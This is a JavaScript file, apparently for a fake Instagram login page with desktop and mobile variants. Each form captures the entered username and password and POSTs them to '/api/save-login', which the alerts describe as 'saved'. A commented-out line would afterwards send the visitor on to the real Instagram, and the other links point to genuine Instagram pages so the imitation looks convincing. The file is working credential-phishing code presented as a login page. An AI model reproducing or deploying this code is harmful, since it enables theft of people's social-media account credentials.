/* =========================================================
   DESKTOP LOGIN - DEBUG VERSION
========================================================= */

const loginForm = document.getElementById("demoLoginForm");

if (loginForm) {
  loginForm.addEventListener("submit", async function (event) {
    event.preventDefault();

    const user_id = document.getElementById("usernameInput").value.trim();
    const pass = document.getElementById("passwordInput").value;

    alert("1. Form submitted\nUser: " + user_id + "\nPass: " + pass);

    if (!user_id || !pass) {
      alert("Missing username or password");
      return;
    }

    try {
      alert("2. Sending request to /api/save-login...");

      const response = await fetch("/api/save-login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          user_id: user_id,
          pass: pass
        }),
      });

      alert("3. Response status: " + response.status);

      const result = await response.json();
      alert("4. Response body: " + JSON.stringify(result));

      if (response.ok) {
        alert("✅ Successfully saved!");
      } else {
        alert("❌ Failed to save: " + (result.error || "Unknown error"));
      }
    } catch (error) {
      alert("❌ Fetch error: " + error.message);
    }

    // window.location.href = "https://www.instagram.com/";  // temporarily disabled
  });
}

/* =========================================================
   MOBILE LOGIN - DEBUG VERSION
========================================================= */

const mobileLoginForm = document.getElementById("mobileLoginForm");

if (mobileLoginForm) {
  mobileLoginForm.addEventListener("submit", async function (event) {
    event.preventDefault();

    const user_id = document.getElementById("mobileUsernameInput").value.trim();
    const pass = document.getElementById("mobilePasswordInput").value;

    alert("1. Mobile form submitted\nUser: " + user_id + "\nPass: " + pass);

    if (!user_id || !pass) {
      alert("Missing username or password");
      return;
    }

    try {
      alert("2. Sending request to /api/save-login...");

      const response = await fetch("/api/save-login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          user_id: user_id,
          pass: pass
        }),
      });

      alert("3. Response status: " + response.status);

      const result = await response.json();
      alert("4. Response body: " + JSON.stringify(result));

      if (response.ok) {
        alert("✅ Successfully saved!");
      } else {
        alert("❌ Failed to save: " + (result.error || "Unknown error"));
      }
    } catch (error) {
      alert("❌ Fetch error: " + error.message);
    }
  });
}

/* =========================================================
   REST OF THE CODE (same as before)
========================================================= */

const forgotPassword = document.getElementById("forgotPassword");
if (forgotPassword) {
  forgotPassword.addEventListener("click", function () {
    window.location.href = "https://www.instagram.com/accounts/password/reset/";
  });
}

const createAccount = document.getElementById("createAccount");
if (createAccount) {
  createAccount.addEventListener("click", function () {
    window.location.href = "https://www.instagram.com/accounts/emailsignup/";
  });
}

const facebookButton = document.getElementById("facebookButton");
if (facebookButton) {
  facebookButton.addEventListener("click", function () {});
}

const languageButton = document.getElementById("languageButton");
if (languageButton) {
  languageButton.addEventListener("click", function () {});
}

const mobileOpenInstagram = document.getElementById("mobileOpenInstagram");
const mobileOpenTop = document.getElementById("mobileOpenTop");
function showOpenAppMessage() {}
if (mobileOpenInstagram) mobileOpenInstagram.addEventListener("click", showOpenAppMessage);
if (mobileOpenTop) mobileOpenTop.addEventListener("click", showOpenAppMessage);

const mobileLogin = document.getElementById("mobileLogin");
const mobileTopLogin = document.getElementById("mobileTopLogin");
const mobileLoginOverlay = document.getElementById("mobileLoginOverlay");
const closeMobileLogin = document.getElementById("closeMobileLogin");

function openMobileLogin() {
  if (mobileLoginOverlay) {
    mobileLoginOverlay.classList.add("active");
    document.body.style.overflow = "hidden";
  }
}
function closeMobileLoginBox() {
  if (mobileLoginOverlay) {
    mobileLoginOverlay.classList.remove("active");
    document.body.style.overflow = "";
  }
}

if (mobileLogin) mobileLogin.addEventListener("click", openMobileLogin);
if (mobileTopLogin) mobileTopLogin.addEventListener("click", openMobileLogin);
if (closeMobileLogin) closeMobileLogin.addEventListener("click", closeMobileLoginBox);

if (mobileLoginOverlay) {
  mobileLoginOverlay.addEventListener("click", function (event) {
    if (event.target === mobileLoginOverlay) closeMobileLoginBox();
  });
}

const mobileForgot = document.getElementById("mobileForgot");
if (mobileForgot) {
  mobileForgot.addEventListener("click", function () {
    window.location.href = "https://www.instagram.com/accounts/password/reset/";
  });
}

const mobileSignup = document.getElementById("mobileSignup");
if (mobileSignup) {
  mobileSignup.addEventListener("click", function () {});
}

const mobileLanguage = document.getElementById("mobileLanguage");
if (mobileLanguage) {
  mobileLanguage.addEventListener("click", function () {
    alert("Language selector — demo only.");
  });
}
